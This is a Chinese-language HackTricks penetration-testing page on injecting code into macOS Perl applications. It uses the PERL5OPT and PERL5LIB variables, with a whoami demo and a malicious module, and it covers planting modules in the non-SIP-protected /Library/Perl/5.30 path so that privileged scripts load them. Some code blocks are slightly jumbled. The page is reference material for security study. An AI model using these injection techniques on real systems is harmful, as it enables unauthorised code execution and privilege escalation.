# macOS Perl 应用程序注入

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF 版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 通过 `PERL5OPT` 和 `PERL5LIB` 环境变量

使用环境变量 PERL5OPT 可以使 perl 执行任意命令。\
例如，创建以下脚本：

{% code title="test.pl" %}
```perl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
{% endcode %}

现在**导出环境变量**并执行**perl**脚本：
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
```perl
package pmod;

use strict;
use warnings;

sub new {
    my $class = shift;
    my $self = {
        _perl_path => shift,
    };

    bless $self, $class;
    return $self;
}

sub execute {
    my ($self, $cmd) = @_;
    system($cmd);
}

1; # End of pmod.pm
```
{% endcode %}
```perl
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
```
并使用环境变量：
```
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## 通过依赖项

可以列出Perl运行的依赖项文件夹顺序：
```bash
perl -e 'print join("\n", @INC)'
```
将返回类似以下内容：
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
有些返回的文件夹甚至不存在，但是 **`/Library/Perl/5.30`** 确实**存在**，它**没有**被**SIP** **保护**，并且位于被SIP保护的文件夹**之前**。因此，有人可以滥用该文件夹，在其中添加脚本依赖项，以便高权限的Perl脚本将加载它。

{% hint style="warning" %}
然而，请注意，您**需要以root身份写入该文件夹**，而且现在您会收到这个**TCC提示**：
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

例如，如果脚本正在导入 **`use File::Basename;`**，那么创建 `/Library/Perl/5.30/File/Basename.pm` 将可以执行任意代码。

## 参考资料

* [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零到英雄学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
